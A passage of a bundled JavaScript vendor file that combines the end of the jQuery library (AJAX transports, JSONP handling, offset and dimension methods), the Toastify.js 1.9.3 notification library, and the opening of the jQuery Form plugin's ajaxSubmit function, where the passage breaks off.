      return !!( elem.offsetWidth || elem.offsetHeight || elem.getClientRects().length );
  };




  jQuery.ajaxSettings.xhr = function() {
      try {
          return new window.XMLHttpRequest();
      } catch ( e ) {}
  };

  var xhrSuccessStatus = {

          // File protocol always yields status code 0, assume 200
          0: 200,

          // Support: IE <=9 only
          // #1450: sometimes IE returns 1223 when it should be 204
          1223: 204
      },
      xhrSupported = jQuery.ajaxSettings.xhr();

  support.cors = !!xhrSupported && ( "withCredentials" in xhrSupported );
  support.ajax = xhrSupported = !!xhrSupported;

  jQuery.ajaxTransport( function( options ) {
      var callback, errorCallback;

      // Cross domain only allowed if supported through XMLHttpRequest
      if ( support.cors || xhrSupported && !options.crossDomain ) {
          return {
              send: function( headers, complete ) {
                  var i,
                      xhr = options.xhr();

                  xhr.open(
                      options.type,
                      options.url,
                      options.async,
                      options.username,
                      options.password
                  );

                  // Apply custom fields if provided
                  if ( options.xhrFields ) {
                      for ( i in options.xhrFields ) {
                          xhr[ i ] = options.xhrFields[ i ];
                      }
                  }

                  // Override mime type if needed
                  if ( options.mimeType && xhr.overrideMimeType ) {
                      xhr.overrideMimeType( options.mimeType );
                  }

                  // X-Requested-With header
                  // For cross-domain requests, seeing as conditions for a preflight are
                  // akin to a jigsaw puzzle, we simply never set it to be sure.
                  // (it can always be set on a per-request basis or even using ajaxSetup)
                  // For same-domain requests, won't change header if already provided.
                  if ( !options.crossDomain && !headers[ "X-Requested-With" ] ) {
                      headers[ "X-Requested-With" ] = "XMLHttpRequest";
                  }

                  // Set headers
                  for ( i in headers ) {
                      xhr.setRequestHeader( i, headers[ i ] );
                  }

                  // Callback
                  callback = function( type ) {
                      return function() {
                          if ( callback ) {
                              callback = errorCallback = xhr.onload =
                                  xhr.onerror = xhr.onabort = xhr.onreadystatechange = null;

                              if ( type === "abort" ) {
                                  xhr.abort();
                              } else if ( type === "error" ) {

                                  // Support: IE <=9 only
                                  // On a manual native abort, IE9 throws
                                  // errors on any property access that is not readyState
                                  if ( typeof xhr.status !== "number" ) {
                                      complete( 0, "error" );
                                  } else {
                                      complete(

                                          // File: protocol always yields status 0; see #8605, #14207
                                          xhr.status,
                                          xhr.statusText
                                      );
                                  }
                              } else {
                                  complete(
                                      xhrSuccessStatus[ xhr.status ] || xhr.status,
                                      xhr.statusText,

                                      // Support: IE <=9 only
                                      // IE9 has no XHR2 but throws on binary (trac-11426)
                                      // For XHR2 non-text, let the caller handle it (gh-2498)
                                      ( xhr.responseType || "text" ) !== "text"  ||
                                      typeof xhr.responseText !== "string" ?
                                          { binary: xhr.response } :
                                          { text: xhr.responseText },
                                      xhr.getAllResponseHeaders()
                                  );
                              }
                          }
                      };
                  };

                  // Listen to events
                  xhr.onload = callback();
                  errorCallback = xhr.onerror = callback( "error" );

                  // Support: IE 9 only
                  // Use onreadystatechange to replace onabort
                  // to handle uncaught aborts
                  if ( xhr.onabort !== undefined ) {
                      xhr.onabort = errorCallback;
                  } else {
                      xhr.onreadystatechange = function() {

                          // Check readyState before timeout as it changes
                          if ( xhr.readyState === 4 ) {

                              // Allow onerror to be called first,
                              // but that will not handle a native abort
                              // Also, save errorCallback to a variable
                              // as xhr.onerror cannot be accessed
                              window.setTimeout( function() {
                                  if ( callback ) {
                                      errorCallback();
                                  }
                              } );
                          }
                      };
                  }

                  // Create the abort callback
                  callback = callback( "abort" );

                  try {

                      // Do send the request (this may raise an exception)
                      xhr.send( options.hasContent && options.data || null );
                  } catch ( e ) {

                      // #14683: Only rethrow if this hasn't been notified as an error yet
                      if ( callback ) {
                          throw e;
                      }
                  }
              },

              abort: function() {
                  if ( callback ) {
                      callback();
                  }
              }
          };
      }
  } );




  // Prevent auto-execution of scripts when no explicit dataType was provided (See gh-2432)
  jQuery.ajaxPrefilter( function( s ) {
      if ( s.crossDomain ) {
          s.contents.script = false;
      }
  } );

  // Install script dataType
  jQuery.ajaxSetup( {
      accepts: {
          script: "text/javascript, application/javascript, " +
              "application/ecmascript, application/x-ecmascript"
      },
      contents: {
          script: /\b(?:java|ecma)script\b/
      },
      converters: {
          "text script": function( text ) {
              jQuery.globalEval( text );
              return text;
          }
      }
  } );

  // Handle cache's special case and crossDomain
  jQuery.ajaxPrefilter( "script", function( s ) {
      if ( s.cache === undefined ) {
          s.cache = false;
      }
      if ( s.crossDomain ) {
          s.type = "GET";
      }
  } );

  // Bind script tag hack transport
  jQuery.ajaxTransport( "script", function( s ) {

      // This transport only deals with cross domain requests
      if ( s.crossDomain ) {
          var script, callback;
          return {
              send: function( _, complete ) {
                  script = jQuery( "<script>" ).prop( {
                      charset: s.scriptCharset,
                      src: s.url
                  } ).on(
                      "load error",
                      callback = function( evt ) {
                          script.remove();
                          callback = null;
                          if ( evt ) {
                              complete( evt.type === "error" ? 404 : 200, evt.type );
                          }
                      }
                  );

                  // Use native DOM manipulation to avoid our domManip AJAX trickery
                  document.head.appendChild( script[ 0 ] );
              },
              abort: function() {
                  if ( callback ) {
                      callback();
                  }
              }
          };
      }
  } );




  var oldCallbacks = [],
      rjsonp = /(=)\?(?=&|$)|\?\?/;

  // Default jsonp settings
  jQuery.ajaxSetup( {
      jsonp: "callback",
      jsonpCallback: function() {
          var callback = oldCallbacks.pop() || ( jQuery.expando + "_" + ( nonce++ ) );
          this[ callback ] = true;
          return callback;
      }
  } );

  // Detect, normalize options and install callbacks for jsonp requests
  jQuery.ajaxPrefilter( "json jsonp", function( s, originalSettings, jqXHR ) {

      var callbackName, overwritten, responseContainer,
          jsonProp = s.jsonp !== false && ( rjsonp.test( s.url ) ?
              "url" :
              typeof s.data === "string" &&
                  ( s.contentType || "" )
                      .indexOf( "application/x-www-form-urlencoded" ) === 0 &&
                  rjsonp.test( s.data ) && "data"
          );

      // Handle iff the expected data type is "jsonp" or we have a parameter to set
      if ( jsonProp || s.dataTypes[ 0 ] === "jsonp" ) {

          // Get callback name, remembering preexisting value associated with it
          callbackName = s.jsonpCallback = jQuery.isFunction( s.jsonpCallback ) ?
              s.jsonpCallback() :
              s.jsonpCallback;

          // Insert callback into url or form data
          if ( jsonProp ) {
              s[ jsonProp ] = s[ jsonProp ].replace( rjsonp, "$1" + callbackName );
          } else if ( s.jsonp !== false ) {
              s.url += ( rquery.test( s.url ) ? "&" : "?" ) + s.jsonp + "=" + callbackName;
          }

          // Use data converter to retrieve json after script execution
          s.converters[ "script json" ] = function() {
              if ( !responseContainer ) {
                  jQuery.error( callbackName + " was not called" );
              }
              return responseContainer[ 0 ];
          };

          // Force json dataType
          s.dataTypes[ 0 ] = "json";

          // Install callback
          overwritten = window[ callbackName ];
          window[ callbackName ] = function() {
              responseContainer = arguments;
          };

          // Clean-up function (fires after converters)
          jqXHR.always( function() {

              // If previous value didn't exist - remove it
              if ( overwritten === undefined ) {
                  jQuery( window ).removeProp( callbackName );

              // Otherwise restore preexisting value
              } else {
                  window[ callbackName ] = overwritten;
              }

              // Save back as free
              if ( s[ callbackName ] ) {

                  // Make sure that re-using the options doesn't screw things around
                  s.jsonpCallback = originalSettings.jsonpCallback;

                  // Save the callback name for future use
                  oldCallbacks.push( callbackName );
              }

              // Call if it was a function and we have a response
              if ( responseContainer && jQuery.isFunction( overwritten ) ) {
                  overwritten( responseContainer[ 0 ] );
              }

              responseContainer = overwritten = undefined;
          } );

          // Delegate to script
          return "script";
      }
  } );




  // Support: Safari 8 only
  // In Safari 8 documents created via document.implementation.createHTMLDocument
  // collapse sibling forms: the second one becomes a child of the first one.
  // Because of that, this security measure has to be disabled in Safari 8.
  // https://bugs.webkit.org/show_bug.cgi?id=137337
  support.createHTMLDocument = ( function() {
      var body = document.implementation.createHTMLDocument( "" ).body;
      body.innerHTML = "<form></form><form></form>";
      return body.childNodes.length === 2;
  } )();


  // Argument "data" should be string of html
  // context (optional): If specified, the fragment will be created in this context,
  // defaults to document
  // keepScripts (optional): If true, will include scripts passed in the html string
  jQuery.parseHTML = function( data, context, keepScripts ) {
      if ( typeof data !== "string" ) {
          return [];
      }
      if ( typeof context === "boolean" ) {
          keepScripts = context;
          context = false;
      }

      var base, parsed, scripts;

      if ( !context ) {

          // Stop scripts or inline event handlers from being executed immediately
          // by using document.implementation
          if ( support.createHTMLDocument ) {
              context = document.implementation.createHTMLDocument( "" );

              // Set the base href for the created document
              // so any parsed elements with URLs
              // are based on the document's URL (gh-2965)
              base = context.createElement( "base" );
              base.href = document.location.href;
              context.head.appendChild( base );
          } else {
              context = document;
          }
      }

      parsed = rsingleTag.exec( data );
      scripts = !keepScripts && [];

      // Single tag
      if ( parsed ) {
          return [ context.createElement( parsed[ 1 ] ) ];
      }

      parsed = buildFragment( [ data ], context, scripts );

      if ( scripts && scripts.length ) {
          jQuery( scripts ).remove();
      }

      return jQuery.merge( [], parsed.childNodes );
  };


  /**
   * Load a url into a page
   */
  jQuery.fn.load = function( url, params, callback ) {
      var selector, type, response,
          self = this,
          off = url.indexOf( " " );

      if ( off > -1 ) {
          selector = stripAndCollapse( url.slice( off ) );
          url = url.slice( 0, off );
      }

      // If it's a function
      if ( jQuery.isFunction( params ) ) {

          // We assume that it's the callback
          callback = params;
          params = undefined;

      // Otherwise, build a param string
      } else if ( params && typeof params === "object" ) {
          type = "POST";
      }

      // If we have elements to modify, make the request
      if ( self.length > 0 ) {
          jQuery.ajax( {
              url: url,

              // If "type" variable is undefined, then "GET" method will be used.
              // Make value of this field explicit since
              // user can override it through ajaxSetup method
              type: type || "GET",
              dataType: "html",
              data: params
          } ).done( function( responseText ) {

              // Save response for use in complete callback
              response = arguments;

              self.html( selector ?

                  // If a selector was specified, locate the right elements in a dummy div
                  // Exclude scripts to avoid IE 'Permission Denied' errors
                  jQuery( "<div>" ).append( jQuery.parseHTML( responseText ) ).find( selector ) :

                  // Otherwise use the full result
                  responseText );

          // If the request succeeds, this function gets "data", "status", "jqXHR"
          // but they are ignored because response was set above.
          // If it fails, this function gets "jqXHR", "status", "error"
          } ).always( callback && function( jqXHR, status ) {
              self.each( function() {
                  callback.apply( this, response || [ jqXHR.responseText, status, jqXHR ] );
              } );
          } );
      }

      return this;
  };




  // Attach a bunch of functions for handling common AJAX events
  jQuery.each( [
      "ajaxStart",
      "ajaxStop",
      "ajaxComplete",
      "ajaxError",
      "ajaxSuccess",
      "ajaxSend"
  ], function( i, type ) {
      jQuery.fn[ type ] = function( fn ) {
          return this.on( type, fn );
      };
  } );




  jQuery.expr.pseudos.animated = function( elem ) {
      return jQuery.grep( jQuery.timers, function( fn ) {
          return elem === fn.elem;
      } ).length;
  };




  jQuery.offset = {
      setOffset: function( elem, options, i ) {
          var curPosition, curLeft, curCSSTop, curTop, curOffset, curCSSLeft, calculatePosition,
              position = jQuery.css( elem, "position" ),
              curElem = jQuery( elem ),
              props = {};

          // Set position first, in-case top/left are set even on static elem
          if ( position === "static" ) {
              elem.style.position = "relative";
          }

          curOffset = curElem.offset();
          curCSSTop = jQuery.css( elem, "top" );
          curCSSLeft = jQuery.css( elem, "left" );
          calculatePosition = ( position === "absolute" || position === "fixed" ) &&
              ( curCSSTop + curCSSLeft ).indexOf( "auto" ) > -1;

          // Need to be able to calculate position if either
          // top or left is auto and position is either absolute or fixed
          if ( calculatePosition ) {
              curPosition = curElem.position();
              curTop = curPosition.top;
              curLeft = curPosition.left;

          } else {
              curTop = parseFloat( curCSSTop ) || 0;
              curLeft = parseFloat( curCSSLeft ) || 0;
          }

          if ( jQuery.isFunction( options ) ) {

              // Use jQuery.extend here to allow modification of coordinates argument (gh-1848)
              options = options.call( elem, i, jQuery.extend( {}, curOffset ) );
          }

          if ( options.top != null ) {
              props.top = ( options.top - curOffset.top ) + curTop;
          }
          if ( options.left != null ) {
              props.left = ( options.left - curOffset.left ) + curLeft;
          }

          if ( "using" in options ) {
              options.using.call( elem, props );

          } else {
              curElem.css( props );
          }
      }
  };

  jQuery.fn.extend( {
      offset: function( options ) {

          // Preserve chaining for setter
          if ( arguments.length ) {
              return options === undefined ?
                  this :
                  this.each( function( i ) {
                      jQuery.offset.setOffset( this, options, i );
                  } );
          }

          var doc, docElem, rect, win,
              elem = this[ 0 ];

          if ( !elem ) {
              return;
          }

          // Return zeros for disconnected and hidden (display: none) elements (gh-2310)
          // Support: IE <=11 only
          // Running getBoundingClientRect on a
          // disconnected node in IE throws an error
          if ( !elem.getClientRects().length ) {
              return { top: 0, left: 0 };
          }

          rect = elem.getBoundingClientRect();

          doc = elem.ownerDocument;
          docElem = doc.documentElement;
          win = doc.defaultView;

          return {
              top: rect.top + win.pageYOffset - docElem.clientTop,
              left: rect.left + win.pageXOffset - docElem.clientLeft
          };
      },

      position: function() {
          if ( !this[ 0 ] ) {
              return;
          }

          var offsetParent, offset,
              elem = this[ 0 ],
              parentOffset = { top: 0, left: 0 };

          // Fixed elements are offset from window (parentOffset = {top:0, left: 0},
          // because it is its only offset parent
          if ( jQuery.css( elem, "position" ) === "fixed" ) {

              // Assume getBoundingClientRect is there when computed position is fixed
              offset = elem.getBoundingClientRect();

          } else {

              // Get *real* offsetParent
              offsetParent = this.offsetParent();

              // Get correct offsets
              offset = this.offset();
              if ( !nodeName( offsetParent[ 0 ], "html" ) ) {
                  parentOffset = offsetParent.offset();
              }

              // Add offsetParent borders
              parentOffset = {
                  top: parentOffset.top + jQuery.css( offsetParent[ 0 ], "borderTopWidth", true ),
                  left: parentOffset.left + jQuery.css( offsetParent[ 0 ], "borderLeftWidth", true )
              };
          }

          // Subtract parent offsets and element margins
          return {
              top: offset.top - parentOffset.top - jQuery.css( elem, "marginTop", true ),
              left: offset.left - parentOffset.left - jQuery.css( elem, "marginLeft", true )
          };
      },

      // This method will return documentElement in the following cases:
      // 1) For the element inside the iframe without offsetParent, this method will return
      //    documentElement of the parent window
      // 2) For the hidden or detached element
      // 3) For body or html element, i.e. in case of the html node - it will return itself
      //
      // but those exceptions were never presented as a real life use-cases
      // and might be considered as more preferable results.
      //
      // This logic, however, is not guaranteed and can change at any point in the future
      offsetParent: function() {
          return this.map( function() {
              var offsetParent = this.offsetParent;

              while ( offsetParent && jQuery.css( offsetParent, "position" ) === "static" ) {
                  offsetParent = offsetParent.offsetParent;
              }

              return offsetParent || documentElement;
          } );
      }
  } );

  // Create scrollLeft and scrollTop methods
  jQuery.each( { scrollLeft: "pageXOffset", scrollTop: "pageYOffset" }, function( method, prop ) {
      var top = "pageYOffset" === prop;

      jQuery.fn[ method ] = function( val ) {
          return access( this, function( elem, method, val ) {

              // Coalesce documents and windows
              var win;
              if ( jQuery.isWindow( elem ) ) {
                  win = elem;
              } else if ( elem.nodeType === 9 ) {
                  win = elem.defaultView;
              }

              if ( val === undefined ) {
                  return win ? win[ prop ] : elem[ method ];
              }

              if ( win ) {
                  win.scrollTo(
                      !top ? val : win.pageXOffset,
                      top ? val : win.pageYOffset
                  );

              } else {
                  elem[ method ] = val;
              }
          }, method, val, arguments.length );
      };
  } );

  // Support: Safari <=7 - 9.1, Chrome <=37 - 49
  // Add the top/left cssHooks using jQuery.fn.position
  // Webkit bug: https://bugs.webkit.org/show_bug.cgi?id=29084
  // Blink bug: https://bugs.chromium.org/p/chromium/issues/detail?id=589347
  // getComputedStyle returns percent when specified for top/left/bottom/right;
  // rather than make the css module depend on the offset module, just check for it here
  jQuery.each( [ "top", "left" ], function( i, prop ) {
      jQuery.cssHooks[ prop ] = addGetHookIf( support.pixelPosition,
          function( elem, computed ) {
              if ( computed ) {
                  computed = curCSS( elem, prop );

                  // If curCSS returns percentage, fallback to offset
                  return rnumnonpx.test( computed ) ?
                      jQuery( elem ).position()[ prop ] + "px" :
                      computed;
              }
          }
      );
  } );


  // Create innerHeight, innerWidth, height, width, outerHeight and outerWidth methods
  jQuery.each( { Height: "height", Width: "width" }, function( name, type ) {
      jQuery.each( { padding: "inner" + name, content: type, "": "outer" + name },
          function( defaultExtra, funcName ) {

          // Margin is only for outerHeight, outerWidth
          jQuery.fn[ funcName ] = function( margin, value ) {
              var chainable = arguments.length && ( defaultExtra || typeof margin !== "boolean" ),
                  extra = defaultExtra || ( margin === true || value === true ? "margin" : "border" );

              return access( this, function( elem, type, value ) {
                  var doc;

                  if ( jQuery.isWindow( elem ) ) {

                      // $( window ).outerWidth/Height return w/h including scrollbars (gh-1729)
                      return funcName.indexOf( "outer" ) === 0 ?
                          elem[ "inner" + name ] :
                          elem.document.documentElement[ "client" + name ];
                  }

                  // Get document width or height
                  if ( elem.nodeType === 9 ) {
                      doc = elem.documentElement;

                      // Either scroll[Width/Height] or offset[Width/Height] or client[Width/Height],
                      // whichever is greatest
                      return Math.max(
                          elem.body[ "scroll" + name ], doc[ "scroll" + name ],
                          elem.body[ "offset" + name ], doc[ "offset" + name ],
                          doc[ "client" + name ]
                      );
                  }

                  return value === undefined ?

                      // Get width or height on the element, requesting but not forcing parseFloat
                      jQuery.css( elem, type, extra ) :

                      // Set width or height on the element
                      jQuery.style( elem, type, value, extra );
              }, type, chainable ? margin : undefined, chainable );
          };
      } );
  } );


  jQuery.fn.extend( {

      bind: function( types, data, fn ) {
          return this.on( types, null, data, fn );
      },
      unbind: function( types, fn ) {
          return this.off( types, null, fn );
      },

      delegate: function( selector, types, data, fn ) {
          return this.on( types, selector, data, fn );
      },
      undelegate: function( selector, types, fn ) {

          // ( namespace ) or ( selector, types [, fn] )
          return arguments.length === 1 ?
              this.off( selector, "**" ) :
              this.off( types, selector || "**", fn );
      }
  } );

  jQuery.holdReady = function( hold ) {
      if ( hold ) {
          jQuery.readyWait++;
      } else {
          jQuery.ready( true );
      }
  };
  jQuery.isArray = Array.isArray;
  jQuery.parseJSON = JSON.parse;
  jQuery.nodeName = nodeName;




  // Register as a named AMD module, since jQuery can be concatenated with other
  // files that may use define, but not via a proper concatenation script that
  // understands anonymous AMD modules. A named AMD is safest and most robust
  // way to register. Lowercase jquery is used because AMD module names are
  // derived from file names, and jQuery is normally delivered in a lowercase
  // file name. Do this after creating the global so that if an AMD module wants
  // to call noConflict to hide this version of jQuery, it will work.

  // Note that for maximum portability, libraries that are not jQuery should
  // declare themselves as anonymous modules, and avoid setting a global if an
  // AMD loader is present. jQuery is a special case. For more information, see
  // https://github.com/jrburke/requirejs/wiki/Updating-existing-libraries#wiki-anon

  if ( typeof define === "function" && define.amd ) {
      define( "jquery", [], function() {
          return jQuery;
      } );
  }




  var

      // Map over jQuery in case of overwrite
      _jQuery = window.jQuery,

      // Map over the $ in case of overwrite
      _$ = window.$;

  jQuery.noConflict = function( deep ) {
      if ( window.$ === jQuery ) {
          window.$ = _$;
      }

      if ( deep && window.jQuery === jQuery ) {
          window.jQuery = _jQuery;
      }

      return jQuery;
  };

  // Expose jQuery and $ identifiers, even in AMD
  // (#7102#comment:10, https://github.com/jquery/jquery/pull/557)
  // and CommonJS for browser emulators (#13566)
  if ( !noGlobal ) {
      window.jQuery = window.$ = jQuery;
  }




  return jQuery;
  } );

  //________________________________________________________________________
/*!
 * Toastify js 1.9.3
 * https://github.com/apvarun/toastify-js
 * @license MIT licensed
 *
 * Copyright (C) 2018 Varun A P
 */
(function(root, factory) {
  if (typeof module === "object" && module.exports) {
    module.exports = factory();
  } else {
    root.Toastify = factory();
  }
})(this, function(global) {
  // Object initialization
  var Toastify = function(options) {
      // Returning a new init object
      return new Toastify.lib.init(options);
    },
    // Library version
    version = "1.9.3";

  // Defining the prototype of the object
  Toastify.lib = Toastify.prototype = {
    toastify: version,

    constructor: Toastify,

    // Initializing the object with required parameters
    init: function(options) {
      // Verifying and validating the input object
      if (!options) {
        options = {};
      }

      // Creating the options object
      this.options = {};

      this.toastElement = null;

      // Validating the options
      this.options.text = options.text || "Hi there!"; // Display message
      this.options.node = options.node // Display content as node
      this.options.duration = options.duration === 0 ? 0 : options.duration || 3000; // Display duration
      this.options.selector = options.selector; // Parent selector
      this.options.callback = options.callback || function() {}; // Callback after display
      this.options.destination = options.destination; // On-click destination
      this.options.newWindow = options.newWindow || false; // Open destination in new window
      this.options.close = options.close || false; // Show toast close icon
      this.options.gravity = options.gravity === "bottom" ? "toastify-bottom" : "toastify-top"; // toast position - top or bottom
      this.options.positionLeft = options.positionLeft || false; // toast position - left or right
      this.options.position = options.position || ''; // toast position - left or right
      this.options.backgroundColor = options.backgroundColor; // toast background color
      this.options.avatar = options.avatar || ""; // img element src - url or a path
      this.options.className = options.className || ""; // additional class names for the toast
      this.options.stopOnFocus = options.stopOnFocus === undefined? true: options.stopOnFocus; // stop timeout on focus
      this.options.onClick = options.onClick; // Callback after click

      this.options.offset = options.offset || { x: 0, y: 0 }; // toast offset

      // Returning the current object for chaining functions
      return this;
    },

    // Building the DOM element
    buildToast: function() {
      // Validating if the options are defined
      if (!this.options) {
        throw "Toastify is not initialized";
      }

      // Creating the DOM object
      var divElement = document.createElement("div");
      divElement.className = "toastify on " + this.options.className;

      // Positioning toast to left or right or center
      if (!!this.options.position) {
        divElement.className += " toastify-" + this.options.position;
      } else {
        // To be depreciated in further versions
        if (this.options.positionLeft === true) {
          divElement.className += " toastify-left";
          console.warn('Property `positionLeft` will be depreciated in further versions. Please use `position` instead.')
        } else {
          // Default position
          divElement.className += " toastify-right";
        }
      }

      // Assigning gravity of element
      divElement.className += " " + this.options.gravity;

      if (this.options.backgroundColor) {
        divElement.style.background = this.options.backgroundColor;
      }

      // Adding the toast message/node
      if (this.options.node && this.options.node.nodeType === Node.ELEMENT_NODE) {
        // If we have a valid node, we insert it
        divElement.appendChild(this.options.node)
      } else {
        divElement.innerHTML = this.options.text;

        if (this.options.avatar !== "") {
          var avatarElement = document.createElement("img");
          avatarElement.src = this.options.avatar;

          avatarElement.className = "toastify-avatar";

          if (this.options.position == "left" || this.options.positionLeft === true) {
            // Adding close icon on the left of content
            divElement.appendChild(avatarElement);
          } else {
            // Adding close icon on the right of content
            divElement.insertAdjacentElement("afterbegin", avatarElement);
          }
        }
      }

      // Adding a close icon to the toast
      if (this.options.close === true) {
        // Create a span for close element
        var closeElement = document.createElement("span");
        closeElement.innerHTML = "&#10006;";

        closeElement.className = "toast-close";

        // Triggering the removal of toast from DOM on close click
        closeElement.addEventListener(
          "click",
          function(event) {
            event.stopPropagation();
            this.removeElement(this.toastElement);
            window.clearTimeout(this.toastElement.timeOutValue);
          }.bind(this)
        );

        //Calculating screen width
        var width = window.innerWidth > 0 ? window.innerWidth : screen.width;

        // Adding the close icon to the toast element
        // Display on the right if screen width is less than or equal to 360px
        if ((this.options.position == "left" || this.options.positionLeft === true) && width > 360) {
          // Adding close icon on the left of content
          divElement.insertAdjacentElement("afterbegin", closeElement);
        } else {
          // Adding close icon on the right of content
          divElement.appendChild(closeElement);
        }
      }

      // Clear timeout while toast is focused
      if (this.options.stopOnFocus && this.options.duration > 0) {
        var self = this;
        // stop countdown
        divElement.addEventListener(
          "mouseover",
          function(event) {
            window.clearTimeout(divElement.timeOutValue);
          }
        )
        // add back the timeout
        divElement.addEventListener(
          "mouseleave",
          function() {
            divElement.timeOutValue = window.setTimeout(
              function() {
                // Remove the toast from DOM
                self.removeElement(divElement);
              },
              self.options.duration
            )
          }
        )
      }

      // Adding an on-click destination path
      if (typeof this.options.destination !== "undefined") {
        divElement.addEventListener(
          "click",
          function(event) {
            event.stopPropagation();
            if (this.options.newWindow === true) {
              window.open(this.options.destination, "_blank");
            } else {
              window.location = this.options.destination;
            }
          }.bind(this)
        );
      }

      if (typeof this.options.onClick === "function" && typeof this.options.destination === "undefined") {
        divElement.addEventListener(
          "click",
          function(event) {
            event.stopPropagation();
            this.options.onClick();
          }.bind(this)
        );
      }

      // Adding offset
      if(typeof this.options.offset === "object") {

        var x = getAxisOffsetAValue("x", this.options);
        var y = getAxisOffsetAValue("y", this.options);

        var xOffset = this.options.position == "left" ? x : "-" + x;
        var yOffset = this.options.gravity == "toastify-top" ? y : "-" + y;

        divElement.style.transform = "translate(" + xOffset + "," + yOffset + ")";

      }

      // Returning the generated element
      return divElement;
    },

    // Displaying the toast
    showToast: function() {
      // Creating the DOM object for the toast
      this.toastElement = this.buildToast();

      // Getting the root element to with the toast needs to be added
      var rootElement;
      if (typeof this.options.selector === "undefined") {
        rootElement = document.body;
      } else {
        rootElement = document.getElementById(this.options.selector);
      }

      // Validating if root element is present in DOM
      if (!rootElement) {
        throw "Root element is not defined";
      }

      // Adding the DOM element
      rootElement.insertBefore(this.toastElement, rootElement.firstChild);

      // Repositioning the toasts in case multiple toasts are present
      Toastify.reposition();

      if (this.options.duration > 0) {
        this.toastElement.timeOutValue = window.setTimeout(
          function() {
            // Remove the toast from DOM
            this.removeElement(this.toastElement);
          }.bind(this),
          this.options.duration
        ); // Binding `this` for function invocation
      }

      // Supporting function chaining
      return this;
    },

    hideToast: function() {
      if (this.toastElement.timeOutValue) {
        clearTimeout(this.toastElement.timeOutValue);
      }
      this.removeElement(this.toastElement);
    },

    // Removing the element from the DOM
    removeElement: function(toastElement) {
      // Hiding the element
      // toastElement.classList.remove("on");
      toastElement.className = toastElement.className.replace(" on", "");

      // Removing the element from DOM after transition end
      window.setTimeout(
        function() {
          // remove options node if any
          if (this.options.node && this.options.node.parentNode) {
            this.options.node.parentNode.removeChild(this.options.node);
          }

          // Remove the elemenf from the DOM, only when the parent node was not removed before.
          if (toastElement.parentNode) {
            toastElement.parentNode.removeChild(toastElement);
          }

          // Calling the callback function
          this.options.callback.call(toastElement);

          // Repositioning the toasts again
          Toastify.reposition();
        }.bind(this),
        400
      ); // Binding `this` for function invocation
    },
  };

  // Positioning the toasts on the DOM
  Toastify.reposition = function() {

    // Top margins with gravity
    var topLeftOffsetSize = {
      top: 15,
      bottom: 15,
    };
    var topRightOffsetSize = {
      top: 15,
      bottom: 15,
    };
    var offsetSize = {
      top: 15,
      bottom: 15,
    };

    // Get all toast messages on the DOM
    var allToasts = document.getElementsByClassName("toastify");

    var classUsed;

    // Modifying the position of each toast element
    for (var i = 0; i < allToasts.length; i++) {
      // Getting the applied gravity
      if (containsClass(allToasts[i], "toastify-top") === true) {
        classUsed = "toastify-top";
      } else {
        classUsed = "toastify-bottom";
      }

      var height = allToasts[i].offsetHeight;
      classUsed = classUsed.substr(9, classUsed.length-1)
      // Spacing between toasts
      var offset = 15;

      var width = window.innerWidth > 0 ? window.innerWidth : screen.width;

      // Show toast in center if screen with less than or qual to 360px
      if (width <= 360) {
        // Setting the position
        allToasts[i].style[classUsed] = offsetSize[classUsed] + "px";

        offsetSize[classUsed] += height + offset;
      } else {
        if (containsClass(allToasts[i], "toastify-left") === true) {
          // Setting the position
          allToasts[i].style[classUsed] = topLeftOffsetSize[classUsed] + "px";

          topLeftOffsetSize[classUsed] += height + offset;
        } else {
          // Setting the position
          allToasts[i].style[classUsed] = topRightOffsetSize[classUsed] + "px";

          topRightOffsetSize[classUsed] += height + offset;
        }
      }
    }

    // Supporting function chaining
    return this;
  };

  // Helper function to get offset.
  function getAxisOffsetAValue(axis, options) {

    if(options.offset[axis]) {
      if(isNaN(options.offset[axis])) {
        return options.offset[axis];
      }
      else {
        return options.offset[axis] + 'px';
      }
    }

    return '0px';

  }

  function containsClass(elem, yourClass) {
    if (!elem || typeof yourClass !== "string") {
      return false;
    } else if (
      elem.className &&
      elem.className
        .trim()
        .split(/\s+/gi)
        .indexOf(yourClass) > -1
    ) {
      return true;
    } else {
      return false;
    }
  }

  // Setting up the prototype for the init object
  Toastify.lib.init.prototype = Toastify.lib;

  // Returning the Toastify function to be assigned to the window object/module
  return Toastify;
});
  //________________________________________________________________________

  (function (factory) {
      "use strict";
      if (typeof define === 'function' && define.amd) {
          // using AMD; register as anon module
          define(['jquery'], factory);
      } else {
          // no AMD; invoke directly
          factory( (typeof(jQuery) != 'undefined') ? jQuery : window.Zepto );
      }
  }

  (function($) {
  "use strict";

  /*
      Usage Note:
      -----------
      Do not use both ajaxSubmit and ajaxForm on the same form.  These
      functions are mutually exclusive.  Use ajaxSubmit if you want
      to bind your own submit handler to the form.  For example,

      $(document).ready(function() {
          $('#myForm').on('submit', function(e) {
              e.preventDefault(); // <-- important
              $(this).ajaxSubmit({
                  target: '#output'
              });
          });
      });

      Use ajaxForm when you want the plugin to manage all the event binding
      for you.  For example,

      $(document).ready(function() {
          $('#myForm').ajaxForm({
              target: '#output'
          });
      });

      You can also use ajaxForm with delegation (requires jQuery v1.7+), so the
      form does not have to exist when you invoke ajaxForm:

      $('#myForm').ajaxForm({
          delegation: true,
          target: '#output'
      });

      When using ajaxForm, the ajaxSubmit function will be invoked for you
      at the appropriate time.
  */

  /**
   * Feature detection
   */
  var feature = {};
  feature.fileapi = $("<input type='file'/>").get(0).files !== undefined;
  feature.formdata = window.FormData !== undefined;

  var hasProp = !!$.fn.prop;

  // attr2 uses prop when it can but checks the return type for
  // an expected string.  this accounts for the case where a form
  // contains inputs with names like "action" or "method"; in those
  // cases "prop" returns the element
  $.fn.attr2 = function() {
      if ( ! hasProp ) {
          return this.attr.apply(this, arguments);
      }
      var val = this.prop.apply(this, arguments);
      if ( ( val && val.jquery ) || typeof val === 'string' ) {
          return val;
      }
      return this.attr.apply(this, arguments);
  };

  /**
   * ajaxSubmit() provides a mechanism for immediately submitting
   * an HTML form using AJAX.
   */
  $.fn.ajaxSubmit = function(options) {
      /*jshint scripturl:true */

      // fast fail if nothing selected (http://dev.jquery.com/ticket/2752)
      if (!this.length) {
          log('ajaxSubmit: skipping submit process - no element selected');
          return this;
      }

      var method, action, url, $form = this;

      if (typeof options == 'function') {
          options = { success: options };
      }
      else if ( options === undefined ) {
          options = {};
      }

      method = options.type || this.attr2('method');
      action = options.url  || this.attr2('action');

      url = (typeof action === 'string') ? $.trim(action) : '';
      url = url || window.location.href || '';
      if (url) {
          // clean url (don't include hash vaue)
          url = (url.match(/^([^#]+)/)||[])[1];
      }

      options = $.extend(true, {
          url:  url,
          success: $.ajaxSettings.success,
